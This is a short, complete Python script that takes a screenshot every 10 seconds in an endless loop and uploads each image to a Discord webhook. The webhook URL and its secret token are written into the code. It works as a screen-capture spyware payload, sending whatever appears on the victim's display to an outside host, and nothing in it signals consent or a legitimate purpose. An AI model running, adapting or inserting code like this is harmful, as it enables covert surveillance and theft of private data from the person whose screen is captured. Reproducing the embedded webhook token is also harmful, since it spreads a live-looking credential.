import pyautogui
import time
import os
from discord_webhook import DiscordWebhook
time.sleep(0.5)
print("Loaded!")
# Create a directory for screenshots if it doesn't exist
screenshot_dir = "screenshots"
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1312530969378422816/CF1lslrfYWpimQxu-Q2N0_nXrRnGjhJ0S6Vb5jrb_aP72_FQsGU5plvixYGTXTf0-bQe"

# Function to capture and send screenshot with additional info
def capture_and_send_screenshot(counter):
    screenshot = pyautogui.screenshot()
    filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
    screenshot.save(filename)

    # Sending the screenshot to Discord
    webhook = DiscordWebhook(url=webhook_url)
    with open(filename, 'rb') as f:
        webhook.add_file(file=f, filename=os.path.basename(filename))
        webhook.execute()

    print(f"Screenshot saved and sent as {filename}")

# Main loop to take screenshots every 10 seconds
counter = 1
while True:
    capture_and_send_screenshot(counter)
    counter += 1
    time.sleep(10)
